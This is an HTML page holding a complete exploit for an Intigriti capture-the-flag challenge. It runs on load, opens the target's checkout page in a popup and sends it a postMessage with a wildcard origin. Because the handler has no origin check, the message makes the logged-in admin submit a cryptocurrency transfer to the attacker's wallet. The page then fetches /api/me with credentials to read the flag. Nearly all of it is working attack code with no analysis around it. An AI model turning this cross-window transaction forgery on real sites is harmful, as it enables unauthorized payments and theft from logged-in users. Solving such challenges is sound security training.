<!DOCTYPE html>
<html>
<head>
    <title>Exploit</title>
</head>
<body>
    <h1>Intigriti Challenge - Simple CSRF Exploit</h1>
    <p id="status">Starting...</p>

    <script>
        const TARGET = 'https://challenge-0126.intigriti.io';
        const OUR_WALLET = '16472226db03703a192aa383237035a69f';

        async function exploit() {
            const status = document.getElementById('status');
            
            status.textContent = 'Opening checkout.html...';
            
            // Open checkout.html in same-origin context
            const checkout = window.open(
                TARGET + '/checkout.html?currency=1337COIN&price=1',
                'checkout',
                'width=500,height=600'
            );

            // Wait for page to load
            await new Promise(r => setTimeout(r, 2000));

            status.textContent = 'Sending postMessage to submit transaction...';
            
            // Send transaction via postMessage (NO ORIGIN CHECK!)
            checkout.postMessage({
                type: 'submitTransaction',
                transaction: {
                    toAddress: OUR_WALLET,
                    currency: '1337COIN',
                    amount: 1
                }
            }, '*');

            status.textContent = 'Transaction submitted! Admin sends 1 1337COIN to ' + OUR_WALLET;
            
            // After transaction, get flag
            setTimeout(async () => {
                status.textContent = 'Getting flag...';
                const response = await fetch(TARGET + '/api/me', { credentials: 'include' });
                const data = await response.json();
                if (data.flag) {
                    status.textContent = 'FLAG: ' + data.flag;
                    alert('FLAG: ' + data.flag);
                } else {
                    status.textContent = 'Waiting for coins...';
                }
            }, 5000);
        }

        // Auto-start
        window.onload = exploit;
    </script>
</body>
</html>
